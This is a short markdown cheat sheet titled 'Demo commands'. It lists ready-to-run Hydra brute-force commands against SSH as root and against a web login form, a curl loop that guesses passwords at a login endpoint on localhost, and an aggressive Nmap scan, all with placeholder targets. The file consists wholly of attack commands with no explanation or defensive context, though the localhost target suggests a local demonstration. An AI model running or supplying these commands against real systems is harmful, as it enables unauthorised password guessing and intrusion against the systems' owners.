# Demo commands

Hydra SSH brute force:
`hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP`

Hydra web brute force:
`hydra -L users.txt -P passwords.txt TARGET_IP http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"`

cURL brute force loop:
`for p in admin 123456 password; do curl -s -X POST http://localhost:5000/login -d "username=admin&password=$p"; done`

Nmap aggressive scan:
`nmap -sS -sV -T4 TARGET_IP`
